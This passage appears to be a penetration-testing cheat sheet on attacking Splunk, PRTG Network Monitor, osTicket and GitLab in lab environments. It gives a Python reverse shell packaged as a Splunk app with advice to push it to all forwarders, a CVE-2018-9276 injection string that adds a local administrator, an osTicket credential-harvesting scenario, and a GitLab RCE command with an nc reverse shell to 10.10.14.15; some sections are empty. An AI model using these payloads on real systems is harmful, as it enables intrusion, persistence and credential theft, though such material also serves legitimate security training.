s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')

Package and upload:

tar -cvzf updater.tar.gz splunk_shell/
# Then in Splunk UI: Apps → Manage Apps → Install app from file → Upload updater.tar.gz

Start listener before uploading:

sudo nc -lnvp 443

The shell connects back almost immediately when the app status changes to "Enabled."

💡 Lateral movement: If Splunk is a deployment server, place the app in $SPLUNK_HOME/etc/deployment-apps/ to push the reverse shell to all Universal Forwarder clients.

🔗 Reference tool: https://github.com/0xjpuff/reverse_shell_splunk

9. PRTG Network Monitor

Overview

  • Agentless network monitor (Delphi-based)
  • Common port: 8080 (or 80/443)
  • Default credentials: prtgadmin:prtgadmin
  • Vulnerable to CVE-2018-9276 — authenticated command injection in Parameter field

Discovery & Footprinting

# Full port scan
sudo nmap -sV -p- --open -T4 10.129.201.50
# Look for: Indy httpd with Paessler PRTG mention

# Confirm version
curl -s http://10.129.201.50:8080/index.htm -A "Mozilla/5.0 (compatible; MSIE 7.01; Windows NT 5.0)" | grep version

CVE-2018-9276 — Command Injection via Notifications

Affects: PRTG Network Monitor < 18.2.39

Steps:
1. Login (try prtgadmin:prtgadmin, prtgadmin:Password123, etc.)
2. Navigate: Setup (top right) → Account Settings → Notifications
3. Click + Add new notification
4. Give it a name, scroll down, check Execute Program
5. Under Program File, select Demo exe notification - outfile.ps1
6. In the Parameter field, inject a command:

test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
  1. Click Save, then click the Test button on the notification

Why it works: The Parameter field is passed directly to a PowerShell script without sanitization. The semicolon chains additional commands after the intended output filename.

Verify the new admin user was created:

sudo crackmapexec smb 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG!
# Expected: [+] APP03\prtgadm1:Pwn3d_by_PRTG! (Pwn3d!)

🎯 What to do next: Use the new local admin account to RDP, WinRM, or run impacket tools (psexec.py, wmiexec.py).

Overview

  • PHP-based support ticketing system, MySQL backend

  • Primary value: Social engineering and credential harvesting
  • Login page at /open.php or similar
  • Cookie OSTSESSID = osTicket fingerprint

Why osTicket Matters for Pentesters

  1. Email address harvesting — Creating a ticket may give you a valid @company.com email address
  2. Credential access — If you can log in as a support agent, you may find passwords in tickets
  3. Password reuse — Credentials found in tickets often work elsewhere

Practical Attack Scenario:

  1. Find exposed osTicket instance
  2. Open a ticket → receive [ticket-id]@company.com email address
  3. Use that email to register on other company services (GitLab, Slack, etc.)
  4. Use OSINT tools like Dehashed to find leaked credentials for company employees
  5. Try found credentials on osTicket login
  6. Browse closed tickets for password resets, internal credentials

Example of ticket data exposure:
- Support agent sends password directly in ticket (common mistake)
- Helpdesk uses standard new-joiner password documented in tickets
- IT staff discuss server configurations in tickets

🔗 Illustrated in HTB box "Delivery" by IppSec: https://youtu.be/gbs43E71mFM

11. GitLab

Overview

  • Web-based Git repository manager (Ruby/Go/Vue.js)

  • Default admin account: root

Discovery

Browse to GitLab URL → redirected to login page with GitLab logo = confirmed.

# Check for public projects (no auth needed)

# Try email → "Email has already been taken"

GitLab User Enumeration Script

CVE — GitLab 13.10.2 Authenticated RCE (ExifTool)

python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f'
